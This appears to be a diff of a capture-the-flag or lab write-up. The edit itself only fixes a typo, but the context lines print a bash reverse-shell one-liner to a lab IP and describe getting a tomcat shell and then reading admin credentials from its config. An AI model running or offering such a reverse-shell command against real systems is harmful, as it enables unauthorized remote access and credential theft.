@@ -74,7 +74,7 @@ I created the **rev.sh** bash script.
 bash -i >& /dev/tcp/10.10.14.66/7777 0>&1
 ```
 
-Setup a listener, send the payload and gota shell as the tomcat user.
+Setup a listener, send the payload and got a shell as the tomcat user.
 ![](tomcatshell.png)
 
 Next I try looking through the conf directory in tomcat's home directory and got a credentials for the user admin.
